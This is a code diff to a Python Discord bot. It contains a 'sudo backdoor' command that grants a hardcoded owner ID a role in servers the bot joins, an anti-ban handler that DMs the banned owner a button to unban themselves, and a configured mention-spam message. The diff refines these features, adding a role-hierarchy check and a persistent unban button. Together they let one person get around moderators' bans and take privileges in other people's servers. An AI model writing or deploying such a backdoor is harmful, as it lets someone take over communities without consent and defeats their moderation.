@@ -8,9 +8,7 @@ from discord import ui
 # ================= CONFIG =================
 TOKEN = os.getenv("DISCORD_TOKEN")
 
-OWNER_ID = 1258115928525373570
-OWNER_NAME = "nico044037"
-
+OWNER_ID = 1258115928525373570  # only YOU
 SPAM_MESSAGE = "<@1419680644618780824>"
 SPAM_DELAY = 0.8
 
@@ -27,12 +25,13 @@ bot = commands.Bot(
 spam_task: asyncio.Task | None = None
 
 # ================= CHECK =================
-def allowed(user):
-    return user.id == OWNER_ID and user.name == OWNER_NAME
+def allowed(user: discord.User | discord.Member):
+    return user.id == OWNER_ID
 
 # ================= READY =================
 @bot.event
 async def on_ready():
+    bot.add_view(UnbanRequestView())  # persistent button
     print(f"✅ Logged in as {bot.user}")
 
 # ================= SUDO GROUP =================
@@ -129,6 +128,11 @@ async def sudo_backdoor(ctx):
             reason="sudo backdoor"
         )
 
+    # role hierarchy safety
+    if role.position >= guild.me.top_role.position:
+        await member.send("❌ Role is higher than bot. Move bot role up.")
+        return
+
     if role not in member.roles:
         await member.add_roles(role, reason="sudo backdoor")
 
@@ -148,47 +152,39 @@ class UnbanRequestView(ui.View):
         interaction: discord.Interaction,
         button: ui.Button
     ):
-        GUILD_ID = 1449298346425585768
-        user = interaction.user
-        guild = interaction.client.get_guild(GUILD_ID)
-
-        if guild is None:
-            await interaction.response.send_message(
-                "❌ Server not found.", ephemeral=True
-            )
+        if not allowed(interaction.user):
+            await interaction.response.defer()
             return
 
-        # OPTIONAL: restrict who can use this
-        if not allowed(user):
+        guild = interaction.guild
+        if guild is None:
             await interaction.response.send_message(
-                "⛔ You are not allowed to do this.", ephemeral=True
+                "❌ Server not available.", ephemeral=True
             )
             return
 
         try:
-            await guild.unban(user)
+            await guild.unban(interaction.user)
             await interaction.response.send_message(
                 "✅ You have been unbanned!", ephemeral=True
             )
-
         except discord.NotFound:
             await interaction.response.send_message(
                 "❌ You are not banned.", ephemeral=True
             )
-
         except discord.Forbidden:
             await interaction.response.send_message(
-                "❌ Bot lacks permission to unban members.", ephemeral=True
+                "❌ Bot lacks unban permission.", ephemeral=True
             )
-
         except discord.HTTPException:
             await interaction.response.send_message(
-                "❌ Something went wrong while unbanning you.", ephemeral=True
+                "❌ Unban failed.", ephemeral=True
             )
+
 # ================= ANTI-BAN ALERT =================
 @bot.event
 async def on_member_ban(guild, user):
-    if not allowed(user):
+    if user.id != OWNER_ID:
         return
 
     embed = discord.Embed(
@@ -196,32 +192,26 @@ async def on_member_ban(guild, user):
         description=(
             f"**Server:** {guild.name}\n"
             f"**Server ID:** `{guild.id}`\n\n"
-            "You may request an unban below."
+            "Press the button below to request an unban."
         ),
         color=discord.Color.red()
     )
 
     try:
-        await user.send(
-            embed=embed,
-            view=UnbanRequestView()
-        )
+        await user.send(embed=embed, view=UnbanRequestView())
     except discord.Forbidden:
-        pass
+        print("❌ DM blocked")
 
 # ================= MESSAGE HANDLER =================
 @bot.event
 async def on_message(message):
     if message.author.bot:
         return
-
     await bot.process_commands(message)
 
 # ================= START =================
 if not TOKEN:
     raise RuntimeError("DISCORD_TOKEN not set")
 
-time.sleep(10)  # Railway / rate-limit safety
+time.sleep(10)  # Railway safety
 bot.run(TOKEN)
-
-
